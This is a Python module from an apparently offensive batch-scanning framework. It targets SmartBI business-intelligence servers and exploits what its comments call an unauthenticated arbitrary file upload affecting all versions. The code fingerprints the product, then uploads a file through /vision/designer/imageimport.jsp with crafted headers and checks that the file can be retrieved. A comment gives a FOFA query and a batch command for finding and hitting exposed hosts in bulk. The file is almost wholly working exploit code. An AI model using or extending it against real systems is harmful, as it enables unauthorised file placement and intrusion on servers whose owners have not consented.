# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-08 16:30

from core.data import gLogger
from exploit.scripts import BaseScript
from core.myenums import BugLevel, BugType
from core.request.asynchttp import *

# fofa: app="SMARTBI"
# python3 batch.py -m exploit.scripts.Report.SmartBI.unauth_uploadfile -cs -fs "app=\"SMARTBI\""


class Script(BaseScript):
    name = 'SmartBI'

    def __init__(self, target):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bug_level = BugLevel.HIGH
        # 类型
        self.bug_type = BugType.UPLOADFILE
        # 编号
        self.bug_number = ''
        # 来源
        self.bug_refer = ''
        # 特定路径判断
        self.detect_path_list = ['/vision/index.jsp']
        # exec
        self.exec_path_list = ['/vision/designer/imageimport.jsp']
        # 相关信息
        self.info = 'SmartBi全版本任意文件上传漏洞'

    async def detect(self):
        async with aiohttp.ClientSession() as session:
            for detect_path in self.detect_path_list:
                url = f'http://{self.target}{detect_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{detect_path}'
                text = await AsyncFetcher.fetch(session=session, url=url, headers=self.headers, timeout=self.req_timeout)
                if text is not None and "gcfutil = jsloader.resolve('smartbi.gcf.gcfutil')" in text:
                    self.flag = True
                    gLogger.myscan_info('[{} {}] {}'.format(self.name, BugType.FINGER, url))
                    return {'name': '{} {}'.format(self.name, BugType.FINGER), 'url': url, 'software': self.name}

    async def exec(self):
        headers = {'X-File-Type': 'image', 'X-File-Name': 'testt.txt', 'Connection': 'close', 'Upgrada-Insecure-Requests': '1', 'Content-Type': 'multipart/form-data; boundary=---------------------------2927288396864', 'Accept-Encoding': 'gzip, deflate'}
        async with aiohttp.ClientSession() as session:
            for exec_path in self.exec_path_list:
                url = f'http://{self.target}{exec_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{exec_path}'
                data = '123456789'
                await AsyncFetcher.post_fetch(session=session, url=url, data=data, headers=headers, timeout=self.req_timeout)
                url2 = f'http://{self.target}/vision/testt.txt' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}/vision/testt.txt'
                text2 = await AsyncFetcher.fetch(session=session, url=url2, headers=headers, timeout=self.req_timeout)
                if text2 is not None and '123456789' in text2:
                    gLogger.myscan_info('[{} {}] {}'.format(self.name, self.bug_type, url))
                    return {'name': '{} {}'.format(self.name, self.bug_type), 'url': url, 'software': self.name}


if __name__ == '__main__':
    pass